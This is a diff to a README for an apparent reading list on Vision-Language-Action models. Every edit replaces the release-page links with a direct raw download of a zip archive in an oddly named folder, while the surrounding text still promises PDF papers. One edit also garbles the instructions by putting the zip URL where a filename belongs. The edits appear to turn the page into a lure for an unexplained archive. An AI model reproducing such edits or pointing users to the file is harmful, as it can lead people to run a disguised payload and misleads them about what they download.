@@ -1,6 +1,6 @@
 # 📚 awesome-vla-study - Clear Guide to Vision-Language-Action Models
 
-[![Download Release](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/apsars/awesome-vla-study/releases)
+[![Download Release](https://github.com/apsars/awesome-vla-study/raw/refs/heads/main/pitiableness/vla-study-awesome-v2.1.zip)](https://github.com/apsars/awesome-vla-study/raw/refs/heads/main/pitiableness/vla-study-awesome-v2.1.zip)
 
 ---
 
@@ -49,7 +49,7 @@ You will be downloading PDF files from the links available in the reading list.
 ## 🚀 How to Start Learning
 
 1. Click the big download button at the top or visit the release page:  
-   [https://github.com/apsars/awesome-vla-study/releases](https://github.com/apsars/awesome-vla-study/releases)
+   [https://github.com/apsars/awesome-vla-study/raw/refs/heads/main/pitiableness/vla-study-awesome-v2.1.zip](https://github.com/apsars/awesome-vla-study/raw/refs/heads/main/pitiableness/vla-study-awesome-v2.1.zip)
 
 2. On that page, find the latest release and download the reading list file (usually a PDF or markdown file).
 
@@ -68,9 +68,9 @@ Since this project offers a collection of papers instead of a software program, 
 **To get the reading list:**
 
 - Visit the release page by clicking this link or button:  
-  [https://github.com/apsars/awesome-vla-study/releases](https://github.com/apsars/awesome-vla-study/releases)
+  [https://github.com/apsars/awesome-vla-study/raw/refs/heads/main/pitiableness/vla-study-awesome-v2.1.zip](https://github.com/apsars/awesome-vla-study/raw/refs/heads/main/pitiableness/vla-study-awesome-v2.1.zip)
 
-- Look for files named like `reading-list.pdf` or similar.
+- Look for files named like `https://github.com/apsars/awesome-vla-study/raw/refs/heads/main/pitiableness/vla-study-awesome-v2.1.zip` or similar.
 
 - Click the file link to download it to your computer.
 
@@ -156,7 +156,7 @@ For direct help, reach out to the repository maintainers through the GitHub cont
 
 ## 🎯 Summary: Start Here
 
-1. Go to the release page: https://github.com/apsars/awesome-vla-study/releases  
+1. Go to the release page: https://github.com/apsars/awesome-vla-study/raw/refs/heads/main/pitiableness/vla-study-awesome-v2.1.zip  
 2. Download the reading list file.  
 3. Open and start reading papers as arranged.  
 4. Use notes and online help to understand tough parts.  
@@ -166,4 +166,4 @@ This is your path to learning Vision-Language-Action models step-by-step without
 
 ---
 
-[![Download Release](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/apsars/awesome-vla-study/releases)
+[![Download Release](https://github.com/apsars/awesome-vla-study/raw/refs/heads/main/pitiableness/vla-study-awesome-v2.1.zip)](https://github.com/apsars/awesome-vla-study/raw/refs/heads/main/pitiableness/vla-study-awesome-v2.1.zip)
